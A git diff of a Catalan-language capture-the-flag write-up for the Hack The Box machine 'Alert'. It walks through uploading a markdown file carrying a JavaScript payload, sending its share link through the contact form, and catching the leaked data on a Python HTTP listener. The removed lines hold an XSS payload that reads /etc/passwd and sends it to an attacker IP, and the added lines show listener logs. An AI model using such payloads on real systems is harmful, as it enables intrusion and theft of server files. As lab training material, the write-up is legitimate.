@@ -214,15 +214,51 @@ Connection: keep-alive
 Priority: u=4
 ```
 
-Per tant, ara ja podem començar a buscar i extreure dades. amb XSS anar provant a veure si aconseguim llegir algun fitxer interessant. A veure si podem llegir el que hi ha al home. Al no tenir una reverse shell, haurem d'utilitzar el payload per llegir l'/etc/passwd, per fer això hem deixat el payload així. Després de vàries proves per fer XSS i buscar el fitxer /etc/passwd, la versió que ha funcionat el payload ha estat la següent:
+Tot i així, aconsegueixo resposta però aconsegueixo només un "%0a" que és símbol d'una nova línia en URL.
+
+Okey, després de molt de temps i moltes proves, he entès com funciona. He canviat la forma d'escoltar o rebre el que rebo a la màquina del servidor gràcies al payload i he passat a utilitzar un servidor http fet amb python: `python3 -m http.server 4444` ja que he vist que és millor per:
+
+Quan necessites processar sol·licituds HTTP.
+Quan vols servir fitxers o preparar respostes personalitzades.
+Quan vols més informació sobre les sol·licituds rebudes.
+Quan treballes amb dades codificades o estructurades.
+
+Llavors, el procés ha passat a ser el següent: Nosaltres carreguem el payload en Javascript dins d'un fitxer .md i el pujem aquí (obviem el nom del fitxer .md ja que l'he reutilitzat):
+
+![image](https://github.com/user-attachments/assets/cde0a411-26c5-43dc-b214-a1f39355f4ed)
+
+UN cop carregat, cliquem a View Markdown, i ens portarà a una pàgina on quan carreguem un fitxer markdown de veritat el podem visualitzar com hem vist abans. Com que no és el cas no veurem res:
+
+![image](https://github.com/user-attachments/assets/8bdbf4c6-dcf7-47fe-a009-124cb60928a9)
+
+Aquí, la clau es troba en anar sobre Share Markdown i el hover ens mostrarà la URL: 
+
+![image](https://github.com/user-attachments/assets/5ecb225c-1e55-47df-9348-0899935d4f4b)
+
+El que hem de fer és copiar aquest link amb el botó dret, o bé podriem clicar a Share Markdown, on la interfície de l'aplicació ens mostrarà un error però tindrem la url a dalt
+
+![image](https://github.com/user-attachments/assets/f804cdf9-5a42-4a2f-8638-02079c1c3f31)
+
+Un cop tenim la URL, anem al formulari de contacte -> Contact Us, i allà enganxem la url al missate:
+
+![image](https://github.com/user-attachments/assets/c939e119-daf7-4ffb-a712-460c4b774ec3)
+
+Cliquem a Send, i veiem un missatge que diu que el missatge s'ha enviat amb èxit:
+
+![image](https://github.com/user-attachments/assets/a90abc07-6e23-40f4-a162-ee239d8ec521)
+
+
+Ara, si anem al servidor http que havíem obert per veure les peticions i respostes que fem nosaltres, veiem que ja tenim una resposta:
 ```
-<script>
-fetch("http://alert.htb/messages.php?file=/etc/passwd")
-  .then(response => response.text())
-  .then(data => {
-    fetch("http://10.10.14.148:4444/?file_content=" + encodeURIComponent(data));
-  });
-</script>
+┌──(kali㉿kali)-[~/Documents/Alert]
+└─$ python3 -m http.server 4444
+
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.10.14.192 - - [06/Dec/2024 09:52:04] "GET /?file_content=%0A HTTP/1.1" 200 -
+10.10.11.44 - - [06/Dec/2024 09:52:58] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
 ```
 
+Amb un string que hem de desxifrar amb URL encode, per exemple: https://www.urldecoder.org/es/
+
+Ara mateix estic aquí en aquesta fase, i em tocarà fer vàries proves de quins fitxers puc llegir/obtenir el seu contingut amb aquest mètode, però almenys ja estem obtenint una resposta i la podem llegir amb l'URL decoder.
 
